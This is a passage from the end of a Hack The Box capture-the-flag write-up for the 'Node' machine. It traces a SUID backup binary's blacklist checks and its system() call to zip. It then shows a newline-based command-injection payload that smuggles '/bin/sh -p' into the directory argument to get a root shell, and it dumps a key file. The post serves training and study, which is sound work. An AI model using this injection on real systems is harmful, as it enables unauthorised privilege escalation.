</pre></table></code></div></div><p>We first see a bunch of <code class="language-plaintext highlighter-rouge">strcmp</code>s which seems to be checks for the <code class="language-plaintext highlighter-rouge">backup_key</code>. There is also the opening of the file <code class="language-plaintext highlighter-rouge">/etc/myplace/keys</code> which contained all the <code class="language-plaintext highlighter-rouge">backup_keys</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>tom@node:/<span class="nv">$ </span><span class="nb">cat</span> /etc/myplace/keys
a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508                                                                                             
45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474                                                                                             
3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110
</pre></table></code></div></div><p>We also a bit of checks for blacklisted characters and strings.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>...
strstr<span class="o">(</span><span class="s2">"/tmp/test"</span>, <span class="s2">".."</span><span class="o">)</span>                        <span class="o">=</span> nil                                                                                                       
strstr<span class="o">(</span><span class="s2">"/tmp/test"</span>, <span class="s2">"/root"</span><span class="o">)</span>                     <span class="o">=</span> nil                                                                                                       
strchr<span class="o">(</span><span class="s2">"/tmp/test"</span>, <span class="s1">';'</span><span class="o">)</span>                         <span class="o">=</span> nil                                                                                                       
strchr<span class="o">(</span><span class="s2">"/tmp/test"</span>, <span class="s1">'&amp;'</span><span class="o">)</span>                         <span class="o">=</span> nil                                                                                                       
strchr<span class="o">(</span><span class="s2">"/tmp/test"</span>, <span class="s1">'`'</span><span class="o">)</span>                         <span class="o">=</span> nil                                                                                                       
strchr<span class="o">(</span><span class="s2">"/tmp/test"</span>, <span class="s1">'$'</span><span class="o">)</span>                         <span class="o">=</span> nil                                                                                                       
strchr<span class="o">(</span><span class="s2">"/tmp/test"</span>, <span class="s1">'|'</span><span class="o">)</span>                         <span class="o">=</span> nil                                                                                                       
strstr<span class="o">(</span><span class="s2">"/tmp/test"</span>, <span class="s2">"//"</span><span class="o">)</span>                        <span class="o">=</span> nil                                                                                                       
strcmp<span class="o">(</span><span class="s2">"/tmp/test"</span>, <span class="s2">"/"</span><span class="o">)</span>                         <span class="o">=</span> 1                                                                                                         
strstr<span class="o">(</span><span class="s2">"/tmp/test"</span>, <span class="s2">"/etc"</span><span class="o">)</span>                      <span class="o">=</span> nil 
... 
</pre></table></code></div></div><p>And lastly, we see the <code class="language-plaintext highlighter-rouge">zip</code> command being executed.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>...
system<span class="o">(</span><span class="s2">"/usr/bin/zip -r -P magicword /tmp/.backup_202542863 /tmp/test &gt; /dev/null"</span><span class="o">)</span>
...
</pre></table></code></div></div><p>We could perhaps inject some commands here since the directory name we supplied is part of the command being executed. However, we will need to watchout for the blacklisted characters and strings. After much trials, I managed to find a way being using newlines!</p><h1 id="exploitation-2">Exploitation (2)</h1><p>By setting my directory name as <code class="language-plaintext highlighter-rouge">"$(printf '\n/bin/sh -p\nid')"</code>, we will get a shell as <code class="language-plaintext highlighter-rouge">root</code>!</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="c"># id</span>
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>tom<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>tom<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,27<span class="o">(</span><span class="nb">sudo</span><span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,115<span class="o">(</span>lpadmin<span class="o">)</span>,116<span class="o">(</span>sambashare<span class="o">)</span>,1002<span class="o">(</span>admin<span class="o">)</span>
</pre></table></code></div></div><p>The reason for this is because the final command performed by <code class="language-plaintext highlighter-rouge">backup</code> will result to:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>system<span class="o">(</span><span class="s2">"/usr/bin/zip -r -P magicword /tmp/.backup_202542863 
        /bin/sh
        id &gt; /dev/null"</span><span class="o">)</span>
</pre></table></code></div></div><p>It will be as if we are running 3 commands at the same time! The reason for the last <code class="language-plaintext highlighter-rouge">id</code> behind is so that <code class="language-plaintext highlighter-rouge">/bin/sh</code> will not run with <code class="language-plaintext highlighter-rouge">&gt; /dev/null</code> behind it, which will cause all the outputs of <code class="language-plaintext highlighter-rouge">/bin/sh</code> to go to <code class="language-plaintext highlighter-rouge">/dev/null</code>.</p><h1 id="roottxt">root.txt</h1><p>The root flag is located in <code class="language-plaintext highlighter-rouge">root</code>’s home directory, as usual.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="c"># cat /root/root.txt</span>
1722XXXXXXXXXXXXXXXXXXXXXXXXXXXX
</pre></table></code></div></div><h3 id="rooted--thank-you-for-reading-and-look-forward-for-more-writeups-and-articles-">Rooted ! Thank you for reading and look forward for more writeups and articles !</h3></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>hackthebox</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/linux/" class="post-tag no-text-decoration" >linux</a> <a href="/tags/express/" class="post-tag no-text-decoration" >express</a> <a href="/tags/mongodb/" class="post-tag no-text-decoration" >mongodb</a> <a href="/tags/command-injection/" class="post-tag no-text-decoration" >command injection</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack The Box - Node (Without Metasploit) - rizemon's blog&url=https://rizemon.github.io/posts/node-htb/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack The Box - Node (Without Metasploit) - rizemon's blog&u=https://rizemon.github.io/posts/node-htb/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hack The Box - Node (Without Metasploit) - rizemon's blog&url=https://rizemon.github.io/posts/node-htb/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/htbcybersanta-ctf/">HackTheBox CTF - Cyber Santa</a><li><a href="/posts/ticket1part2-thm/">TryHackMe - Pre Security Learning Path (Part 2) [PARTICIPATE IN THE GIVEAWAY!]</a><li><a href="/posts/oscp-reflection/">Post-OSCP Writeup</a><li><a href="/posts/granny-htb/">Hack The Box - Granny (Without Metasploit)</a><li><a href="/posts/cronos-htb/">Hack The Box - Cronos (Without Metasploit)</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/juicypotato/">juicypotato</a> <a class="post-tag" href="/tags/rsa/">rsa</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/sudo/">sudo</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/mango-htb/"><div class="card-body"> <span class="timeago small" > Apr 19, 2020 <i class="unloaded">2020-04-19T05:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Mango</h3><div class="text-muted small"><p> Configuration The operating systems that I will be using to tackle this machine is a Kali Linux VM. What I learnt from other writeups is that it was a good habit to map a domain name to the mac...</p></div></div></a></div><div class="card"> <a href="/posts/dsonus2021-insecure-ctf/"><div class="card-body"> <span class="timeago small" > Aug 2, 2021 <i class="unloaded">2021-08-02T17:19:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>DSO NUS CTF - Insecure</h3><div class="text-muted small"><p> Description Someone once told me that SUID is a bad idea. Could you show me why? This challenge server can be accessed here: (Any one of the options below is fine) (Suggested access via ‘...</p></div></div></a></div><div class="card"> <a href="/posts/delivery-htb/"><div class="card-body"> <span class="timeago small" > May 23, 2021 <i class="unloaded">2021-05-23T03:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Delivery</h3><div class="text-muted small"><p> Configuration The operating system that I will be using to tackle this machine is a Kali Linux VM. What I learnt from other writeups is that it was a good habit to map a domain name to the mach...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/solidstate-htb/" class="btn btn-outline-primary"><p>Hack The Box - SolidState (Without Metasploit)</p></a> <a href="/posts/granny-htb/" class="btn btn-outline-primary"><p>Hack The Box - Granny (Without Metasploit)</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/rizemon">rizemon</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy/" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/juicypotato/">juicypotato</a> <a class="post-tag" href="/tags/rsa/">rsa</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/sudo/">sudo</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://rizemon.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
